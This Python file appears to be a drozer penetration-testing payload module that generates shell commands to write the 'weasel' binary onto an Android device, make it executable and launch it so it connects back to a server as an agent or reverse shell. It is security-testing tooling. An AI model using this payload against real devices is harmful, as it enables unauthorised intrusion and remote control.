import os

from reversec.common import fs

from drozer.configuration import Configuration
from drozer.modules import common, Module

class ARMEABI(Module, common.ShellCode):

    name = "Deploy weasel, through a set of Shell commands (ARMEABI)"
    description = """
    Run weasel given a shell to execute code in, to establish a foothold on the
    device.
    
    This module connects to the drozer Server, and sends 0x57 (W) to request
    weasel. The drozer Server will attempt to transfer and run weasel, establishing
    some kind of connection back to the server.
    
    weasel will establish a connection back in one of a few ways:
    
      * a full Agent
      * a stripped-down Agent
      * a reverse shell
    
    You can collect the shell by connecting to the server and sending 'COLLECT'
    as the first line.
    """
    examples = """
    $ drozer payload build weasel.shell.armeabi  --server 10.0.2.2:31420
    """
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-07-18"
    license = "BSD (3 clause)"
    module_type = "payload"
    path = ["weasel.shell"]
    
    def __init__(self, session, loader, exploit=None):
        Module.__init__(self, session)
        
        self.__exploit = exploit
        self.__loader = loader
    
    def add_arguments(self, parser):
        parser.add_argument("--working-directory", default=None, help="specify the directory that weasel will execute in")

    def generate(self, arguments):
        self.format = "R"   # we only support RAW format
        
        architecture = "armeabi"
        if arguments.working_directory != None:
            directory = arguments.working_directory
        elif self.__exploit != None:
            directory = self.__exploit.working_directory
        else:
            directory = "/data/data/com.android.browser"
        weasel = Configuration.library(os.path.join("weasel", architecture, "w"))
        
        self.append(self.hexifyString("cd %s\n" % directory))
        self.append(self.hexifyString("/system/bin/rm w\n"))
        self.append(self.hexifyString("echo -e \"%s\" > w\n" % "".join(map(lambda b: "\\0%.3o" % ord(b), fs.read(weasel)))))
        self.append(self.hexifyString("/system/bin/chmod 770 w\n"))
        self.append(self.hexifyString("./w %s %d\n" % arguments.server))
        
